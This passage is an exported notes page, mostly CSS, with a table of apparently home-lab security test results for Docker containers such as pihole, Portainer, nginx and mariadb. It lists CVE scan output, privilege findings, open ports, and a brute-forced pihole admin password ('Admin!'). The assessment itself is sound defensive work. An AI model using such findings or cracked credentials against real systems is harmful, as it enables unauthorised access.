@@ -1,0 +1,687 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Testing</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: undefined; }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-transparentGray { background-color: undefined; }
+.select-value-color-translucentGray { background-color: undefined; }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="197e4d3f-f493-80c5-a5b6-fa56a7dc319f" class="page sans"><header><h1 class="page-title">Testing</h1><p class="page-description"></p></header><div class="page-body"><table id="197e4d3f-f493-803b-8e45-cbbe62932661" class="simple-table"><thead class="simple-table-header"><tr id="197e4d3f-f493-8079-8be6-f3aaee393b10"><th id="]U_P" class="simple-table-header-color simple-table-header">Container</th><th id="Vb{J" class="simple-table-header-color simple-table-header" style="width:153.00000762939453px">Trivy</th><th id="A@y\" class="simple-table-header-color simple-table-header">DBfS</th><th id="w&gt;n}" class="simple-table-header-color simple-table-header">Linpeas</th><th id="\]_Q" class="simple-table-header-color simple-table-header">Metasploit</th><th id="Mpbu" class="simple-table-header-color simple-table-header">Hydra/ Python Script</th><th id="TRhj" class="simple-table-header-color simple-table-header">Falco</th><th id="UMtr" class="simple-table-header-color simple-table-header">Notes</th><th id="qjIY" class="simple-table-header-color simple-table-header">whoami check</th><th id="yMH;" class="simple-table-header-color simple-table-header">Capability check</th><th id="`U&lt;f" class="simple-table-header-color simple-table-header">Host mounts</th><th id="uqYw" class="simple-table-header-color simple-table-header">Host File Access</th><th id="xvOj" class="simple-table-header-color simple-table-header">Runc exploitable</th><th id="D^BA" class="simple-table-header-color simple-table-header">Wireshark</th><th id="tl_l" class="simple-table-header-color simple-table-header">Other Exploits</th><th id="tYz^" class="simple-table-header-color simple-table-header">Final Notes</th></tr></thead><tbody><tr id="197e4d3f-f493-8021-8296-d621298c7ff5"><th id="]U_P" class="simple-table-header-color simple-table-header">pihole</th><td id="Vb{J" class="" style="width:153.00000762939453px">Critical:<br/>None detected<br/><br/>High:<br/>CVE-2024-56171<br/>CVE-2025-24928<br/>Medium:<br/>None detected<br/><br/>Low:<br/>AVD-DS-0005 (Misconfiguration: Use COPY instead of ADD in Dockerfile)<br/>AVD-DS-0026 (Misconfiguration: Missing HEALTHCHECK instruction in Dockerfile)<br/></td><td id="A@y\" class="">Score: 7<br/>- Root User<br/>-No host sec auditiing<br/>- Not using namespaces, contianers map to host users<br/>- no CPU/ RAM limits<br/></td><td id="w&gt;n}" class="">- Writable files owned by root<br/>- Excessive priv<br/>- users with no passwords<br/>- SSH key permissions are bad<br/></td><td id="\]_Q" class="">N/A<br/><br/>HTTP &amp; DNS<br/></td><td id="Mpbu" class="">Vulnerable!!<br/><br/>Password: Admin!<br/></td><td id="TRhj" class="">Critical Executing binary not part of base image (proc_exe=pihole-FTL proc_sname=<a href="http://start.sh/">start.sh</a> gparent=bash proc_exe_ino_ctime=1741598864344415666 proc_exe_ino_mtime=1740103147000000000 proc_exe_ino_ctime_duration_proc_start=2784732277 proc_cwd=/ container_start_ts=1741598863147718926 evt_type=execve user=root user_uid=0 user_loginuid=-1 process=pihole-FTL proc_exepath=/usr/bin/pihole-FTL parent=bash command=pihole-FTL version terminal=0 exe_flags=EXE_WRITABLE|EXE_UPPER_LAYER container_id=5bdda227532f container_name=pihole)</td><td id="UMtr" class=""></td><td id="qjIY" class="">root</td><td id="yMH;" class="">[NET_ADMIN]</td><td id="`U&lt;f" class="">Two mounts in local home dir for pihole db<br/><br/>R/W but Not exploitable<br/></td><td id="uqYw" class="">No</td><td id="xvOj" class="">No</td><td id="D^BA" class="">All expected. DNS queries and HTTP to connect to admin console.</td><td id="tl_l" class="">Priv: false<br/>Proc: no<br/>nmap: 53,80 (DNS, HTTP admin)<br/></td><td id="tYz^" class=""></td></tr><tr id="197e4d3f-f493-80c5-b2bf-c1f37f8569bb"><th id="]U_P" class="simple-table-header-color simple-table-header">itzg/minecraft-server (JAVA)</th><td id="Vb{J" class="" style="width:153.00000762939453px">Medium Issues:<br/>- CVE-2024-9143, CVE-2024-41996<br/>- CVE-2024-52615, CVE-2024-52616<br/>- CVE-2024-12133<br/>- CVE-2024-26462, CVE-2025-24528<br/>- CVE-2020-25664<br/>Low-Risk Issue:<br/>CVE-2016-2781<br/>CVE-2025-0167<br/></td><td id="A@y\" class="">- Root User<br/>- No user namespace remapping<br/>- No CPU/RAM limits<br/>- No logging<br/></td><td id="w&gt;n}" class="">- Writable files owned by root<br/>- Unquoted service paths could allow privilege escalation.<br/></td><td id="\]_Q" class="">N/A</td><td id="Mpbu" class="">N/A</td><td id="TRhj" class=""></td><td id="UMtr" class=""></td><td id="qjIY" class="">root</td><td id="yMH;" class="">[ ]</td><td id="`U&lt;f" class="">One mount for the minecraft server data, propogation private, looks like its fine and its as expected</td><td id="uqYw" class="">No</td><td id="xvOj" class="">No</td><td id="D^BA" class="">- Traffic between server and local PC (expected)<br/>- Lots of regular traffic (every 10 seconds) between server and IP: 13.107.246.64:443. Doing a whois its something to do with microsoft azure<br/><br/></td><td id="tl_l" class="">priv: false<br/>proc: “/home/ldeb/docker-research/containers/mc/mc-data” is viewable from within the container, as well as “/dev/nvme0n1p5”<br/>nmap:  25565/tcp ← expected as this is the default MC port<br/>25575/tcp ← labelled as unknown in nmap. This is RCON which is a way to interact with the server as a server admin outside of being an op within the game, could be insecure if left open and exposed?<br/></td><td id="tYz^" class=""></td></tr><tr id="197e4d3f-f493-8030-96ee-dd5337b0ef58"><th id="]U_P" class="simple-table-header-color simple-table-header">Open web-ui with ollama</th><td id="Vb{J" class="" style="width:153.00000762939453px">N/A</td><td id="A@y\" class="">- Root User<br/>- No user namespace remapping<br/>- Contianer can gain new privileges<br/>- No CPU/RAM limits<br/>- No centralised logging<br/>- Unrestricted network traffic<br/></td><td id="w&gt;n}" class="">- Writable files owned by root<br/>- Unquoted service paths could allow privilege escalation.<br/></td><td id="\]_Q" class="">N/A</td><td id="Mpbu" class="">Using a python script to send requests, no rate limiting built in, vulnerable to brute force attacks</td><td id="TRhj" class=""></td><td id="UMtr" class="">model has been grabed with ollama run llama3.2:1b in ollama</td><td id="qjIY" class="">root</td><td id="yMH;" class="">[ ]</td><td id="`U&lt;f" class="">Uses volume mounts rather than bind mounts, way more secure!<br/>/var/lib/docker/volumes/open-webui:/app/backend/data<br/></td><td id="uqYw" class="">No</td><td id="xvOj" class="">No</td><td id="D^BA" class="">The majority of the traffic captures is between the open-webui server and my client however there are three TCP streams that stand out:<br/>- Brief communication with IP: 162.159.140.245, this appears to be a cloudflare node but not sure what for.<br/>- Brief communications with IP: 52.84.90.129, also a cloudflare node<br/>- Brief communications with IP: 20.26.156.210, when visited this brings up a bad request errror with links to something called github status so I assumet this is some sort of API request for something to do with guthub but its all encrypted so I cannot tell<br/></td><td id="tl_l" class="">priv: false<br/>proc: As its using volume mounts its all good!<br/>nmap: 8080:3000 (HTTP login)<br/></td><td id="tYz^" class="">opeb-webui sends login api posts in plaintext meaning for HTTP only passwords are sent over plaintext (not a docker issue really) </td></tr><tr id="197e4d3f-f493-8069-8f73-f0485cf3e4f8"><th id="]U_P" class="simple-table-header-color simple-table-header">Portainer</th><td id="Vb{J" class="" style="width:153.00000762939453px">Critical:<br/>None detected<br/><br/>High:<br/>CVE-2024-45338<br/>Medium:<br/>CVE-2025-22866<br/>CVE-2024-45336<br/>CVE-2024-45341<br/>CVE-2024-51744<br/>Low:<br/>CVE-2024-51744<br/></td><td id="A@y\" class="">- Root User<br/>- Docker socket is mounted!!<br/>- No user namespace remapping<br/>- Contianer can gain new privileges<br/>- No CPU/RAM limits<br/>- Root file system is read write<br/>- No centralised logging<br/><br/><br/></td><td id="w&gt;n}" class="">- Writable files owned by root<br/>- Unquoted service paths could allow privilege escalation.<br/></td><td id="\]_Q" class="">N/A</td><td id="Mpbu" class="">Rate limiting!!<br/>Plus https<br/></td><td id="TRhj" class=""></td><td id="UMtr" class="">This app is a container manager so the docker socket has to be mounted in order to use it</td><td id="qjIY" class="">N/A</td><td id="yMH;" class="">[ ]</td><td id="`U&lt;f" class="">Uses volume mounts rather than bind mounts, way more secure!</td><td id="uqYw" class="">Socket is mounted, bad but necessary </td><td id="xvOj" class="">N/A / NO</td><td id="D^BA" class="">- literally nothing it all seems to be local although was only ran for 5 minutes</td><td id="tl_l" class="">priv: false<br/>proc: N/A<br/>nmap: 8000/tcp, 9000/tcp, 9443/tcp<br/></td><td id="tYz^" class="">Cannot sh into this box using exec therefore some information cannot be found</td></tr><tr id="197e4d3f-f493-8019-a030-dd58f59400a9"><th id="]U_P" class="simple-table-header-color simple-table-header">nginx</th><td id="Vb{J" class="" style="width:153.00000762939453px">Critical:<br/>CVE-2023-6879<br/>High:<br/>CVE-2023-39616<br/>CVE-2023-52425<br/>CVE-2024-25062<br/>CVE-2024-56171<br/>CVE-2025-24928<br/>Medium:<br/>CVE-2024-11053<br/>CVE-2025-0838<br/>CVE-2025-24528<br/>CVE-2025-27113<br/>CVE-2025-1390<br/>CVE-2025-0395<br/>CVE-2023-50495<br/>CVE-2023-6277<br/>CVE-2024-13176<br/>CVE-2024-2236<br/>CVE-2023-1916<br/>CVE-2023-3164<br/>CVE-2023-6228<br/>CVE-2024-26462<br/>CVE-2024-10041<br/>CVE-2024-22365<br/>CVE-2023-4641<br/>CVE-2023-29383<br/>CVE-2024-50602<br/>CVE-2022-49043<br/>CVE-2023-39615<br/>CVE-2023-45322<br/>Low:<br/>CVE-2016-2781<br/>CVE-2025-0167<br/>CVE-2022-27943<br/>CVE-2023-4039<br/>CVE-2017-9937<br/>CVE-2024-2379<br/>CVE-2024-26458<br/>CVE-2024-26461<br/>CVE-2023-52426<br/>CVE-2024-28757<br/>CVE-2024-34459<br/></td><td id="A@y\" class="">- Root User<br/>- No security auditing<br/>- Unrestricted network traffic<br/>- No namespace remapping<br/>No logging<br/>- Privileges ports<br/></td><td id="w&gt;n}" class="">- Directories owned by root<br/>- Weak file permissions<br/></td><td id="\]_Q" class="">N/A</td><td id="Mpbu" class="">N/A</td><td id="TRhj" class=""></td><td id="UMtr" class="">172.18.0.5</td><td id="qjIY" class="">root</td><td id="yMH;" class="">[ ]</td><td id="`U&lt;f" class="">Propagation private one mount for nginx config, as expected</td><td id="uqYw" class="">No</td><td id="xvOj" class="">No</td><td id="D^BA" class="">All normal</td><td id="tl_l" class="">priv: false<br/>proc: exposed mount for volune for nginx config, /home/user/docker-research/containers/website/nginx/default.conf<br/>nmap: 80/tcp<br/></td><td id="tYz^" class=""></td></tr><tr id="197e4d3f-f493-801d-b947-c66e3b5f1ba4"><th id="]U_P" class="simple-table-header-color simple-table-header">mariadb</th><td id="Vb{J" class="" style="width:153.00000762939453px"><strong>Critical:</strong><br/>- CVE-2023-24538<br/>- CVE-2023-24540<br/>- CVE-2024-24790<br/><br/><br/><strong>High:</strong><br/>- CVE-2024-13176<br/>- CVE-2024-26462<br/>- CVE-2024-56433<br/><br/><br/><strong>Medium:</strong><br/>- CVE-2016-2781<br/><br/><br/><strong>Low:</strong><br/>- CVE-2025-0167  <br/></td><td id="A@y\" class="">- Root User<br/>- Traffic between containers<br/>- No user namespace remapping<br/><strong><br/>- No security auditing<br/>- Root file system is read-write<br/>- No logging<br/>- priv ports<br/><br/></strong></td><td id="w&gt;n}" class="">- Dir owned by root<br/>- Weak permissions on creds<br/>- services running as root<br/></td><td id="\]_Q" class="">N/A</td><td id="Mpbu" class="">N/A</td><td id="TRhj" class=""></td><td id="UMtr" class="">172.18.0.3</td><td id="qjIY" class="">root</td><td id="yMH;" class="">[ ]</td><td id="`U&lt;f" class="">Volume mount rather than bind mount</td><td id="uqYw" class="">Socket is not mounted</td><td id="xvOj" class="">No</td><td id="D^BA" class="">All normal</td><td id="tl_l" class="">priv: false<br/>proc: has the volume mount, nice! /var/lib/docker/containers<br/>nmap: 3306/tcp<br/></td><td id="tYz^" class=""></td></tr><tr id="197e4d3f-f493-807a-bd31-cca0a1feccfa"><th id="]U_P" class="simple-table-header-color simple-table-header">mongodb</th><td id="Vb{J" class="" 